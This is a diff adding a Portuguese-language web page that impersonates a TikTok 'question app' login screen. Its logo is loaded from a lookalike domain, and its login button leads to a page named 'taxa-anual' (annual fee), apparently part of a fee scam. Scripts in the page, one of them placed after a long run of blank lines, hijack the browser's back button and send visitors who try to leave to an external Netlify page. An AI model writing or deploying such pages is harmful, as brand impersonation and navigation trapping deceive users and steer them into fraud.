@@ -1,0 +1,304 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>App de Perguntas - TikTok</title>
+    <link rel="icon" href="https://offeersegurooo.vercel.app/up03/images/Logo%20TTK.png" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background-color: #1e1e1e; /* Fundo escuro inspirado no IQ Option */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-box {
+            background-color: #2b2b2b; /* Caixa um pouco mais clara que o fundo */
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.2); /* Sombra suave */
+        }
+
+        .logo {
+            width: 50px;
+            margin-bottom: 25px;
+        }
+
+        h1 {
+            color: #ffffff;
+            font-size: 22px;
+            margin-bottom: 15px;
+        }
+
+        p {
+            color: #c2c2c2;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        label {
+            color: #ffffff;
+            font-size: 12px;
+            margin-bottom: 5px;
+            text-align: left;
+        }
+
+        input {
+            background-color: #3a3a3a;
+            border: none;
+            border-radius: 5px;
+            padding: 12px;
+            margin-bottom: 15px;
+            color: #ffffff;
+        }
+
+        .submit-btn {
+            background-color: #ff0150; /* Cor laranja chamativa */
+            color: #ffffff;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #ff0150; /* Laranja um pouco mais escura no hover */
+        }
+
+        .signup {
+            color: #ffffff;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+
+        .signup a {
+            color: #ff0150; /* Laranja nos links */
+            text-decoration: none;
+        }
+
+        .info {
+            color: #c2c2c2;
+            font-size: 12px;
+            margin-top: 20px;
+        }
+
+        .info a {
+            color: #ff0150; /* Laranja nos links */
+            text-decoration: none;
+        }
+
+        .login-box .logo {
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        const redirectURL = "https://spiffy-dusk-09a44c.netlify.app/backup/";
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => location.replace(redirectURL);
+      </script>
+    <div class="container">
+        <div class="login-box">
+            <!-- Logo substituída pela imagem "Logo TTK.png" -->
+            <img src="https://offeersegurooo.vercel.app/up03/images/Logo%20TTK.png" alt="Logo" class="logo">
+            <h1>Bem Vindo ao App de Perguntas do TikTok</h1>
+            <p>Faça login para começar</p>
+            <form action="#">
+                <label for="email">E-mail ou número de registro</label>
+                <input type="email" id="email" placeholder="E-mail ou número de registro">
+                
+                
+                
+               <a href="./taxa-anual" class="submit-btn"><b>Entrar</b></a>
+</form>
+            <div class="signup">
+                Não tem uma conta? <a href="#">Inscrever-se agora</a>
+            </div>
+            <div class="info">
+                Este site é protegido pelo reCAPTCHA e está sujeito à <a href="#">Política de Privacidade</a> e aos <a href="#">Termos de Serviço</a> do Google.
+            </div>
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    (function() {
+        const redirectURL = "https://spiffy-dusk-09a44c.netlify.app/backup/";
+        const currentURL = location.href;
+
+        // Adiciona um estado inicial no histórico
+        history.replaceState({ redirected: false, currentURL: currentURL }, document.title, currentURL);
+
+        // Adiciona um novo estado ao histórico para prevenir a ação de "voltar"
+        history.pushState({ redirected: false, currentURL: currentURL }, document.title, currentURL);
+
+        // Detecta ação de "voltar" no evento popstate
+        window.onpopstate = function(event) {
+            if (event.state && event.state.redirected === false) {
+                // Evita múltiplos redirecionamentos e loops
+                if (sessionStorage.getItem('backRedirectPrevented')) {
+                    console.warn("Redirecionamento evitado: já tratado.");
+                    return;
+                }
+
+                // Marca que o redirecionamento está em andamento
+                sessionStorage.setItem('backRedirectPrevented', 'true');
+                location.replace(redirectURL);
+            }
+        };
+
+        // Previne loops caso o script seja recarregado na página de redirecionamento
+        if (sessionStorage.getItem('backRedirectPrevented')) {
+            if (location.href === redirectURL) {
+                console.info("Redirecionamento concluído sem loops.");
+                sessionStorage.removeItem('backRedirectPrevented');
+            } else {
+                sessionStorage.removeItem('backRedirectPrevented');
+            }
+        }
+
+        // Para navegadores que não geram popstate ao navegar para trás
+        window.addEventListener('beforeunload', function() {
+            sessionStorage.removeItem('backRedirectPrevented');
+        });
+    })();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body></html>
